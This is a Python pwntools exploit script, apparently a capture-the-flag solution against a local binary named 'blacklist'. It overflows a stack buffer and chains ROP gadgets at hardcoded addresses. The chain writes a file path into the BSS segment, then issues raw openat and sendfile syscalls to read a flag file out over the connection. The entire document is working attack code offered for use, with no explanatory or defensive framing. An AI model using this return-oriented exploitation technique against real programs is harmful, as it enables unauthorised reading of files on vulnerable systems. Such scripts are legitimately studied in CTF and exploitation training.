from pwn import *

context.log_level = 'info'
#p = process("./blacklist")
p = remote('localhost',1234)
def writeinBSS(address,offset):
    global BSS,poprdx,poprax,movraxedx
    payload = ""
    payload += p64(poprdx)
    payload += p64(address)
    payload += p64(poprax)
    payload += p64(BSS+offset)
    payload += p64(movraxedx)
    return payload

poprdi = 0x00000000004017b6
poprsi = 0x00000000004024f6
poprdx = 0x0000000000401db2
poprax = 0x0000000000401daf
popr8  = 0x0000000000401dae
popr9  = 0x0000000000401d6d
popr10 = 0x0000000000401db1
syscallret = 0x000000000041860c
movraxedx = 0x000000000046686e
ret = 0x0000000000401016

BSS = 0x00000000004d1260

payload = ""
payload += cyclic(72)
payload += p64(ret)
#writing flag path in BSS#

path = "/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt"
path = path.encode('hex').lstrip('0x')
pt = [path[i:i+8] for i in range(0,len(path),8)]
offset = 0
for i in pt:
    x = ""
    for j in range(len(i)-1,0,-2):
        x += i[j-1:j+1]
    x = int("0x"+x,16)
    payload += writeinBSS(x,offset)
    offset += 4

#Openat flag file#
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(BSS)
payload += p64(poprdx)
payload += p64(0)
payload += p64(popr10)
payload += p64(0)
payload += p64(poprax)
payload += p64(257)
payload += p64(syscallret)

#sendfile#
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsi)
payload += p64(3)
payload += p64(poprdx)
payload += p64(0)
payload += p64(popr10)
payload += p64(100)
payload += p64(poprax)
payload += p64(40)
payload += p64(syscallret)
pause()
log.warn('sending payload')
p.sendline(payload)
p.interactive()
